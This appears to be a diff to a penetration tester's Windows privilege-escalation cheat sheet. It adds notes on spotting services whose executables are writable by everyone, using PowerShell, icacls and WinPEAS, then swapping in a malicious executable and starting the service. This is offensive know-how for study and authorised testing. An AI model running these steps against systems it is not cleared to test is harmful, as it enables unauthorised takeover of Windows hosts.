@@ -171,13 +171,19 @@ set target 1(x64,0=x86)
 Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
 
-### Insecure File Permissions
+### Insecure Service Executables
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
 2. icacls "service path" # check if current user has permission to replace file with malicious one
 3. replace malicious exe with service executable
 4. Get-WmiObject -Class Win32_Service -Property StartMode -Filter "Name='Service Name'" 
 5. whoami /priv #check out shutdown privileges of user
+```
+```
+#In Winpeas look for a service which has the following
+File Permissions: Everyone [AllAccess]
+#Replace the executable in the service folder and start the service
+sc start <service>
 ```
 
 ### Unquoted Service Paths
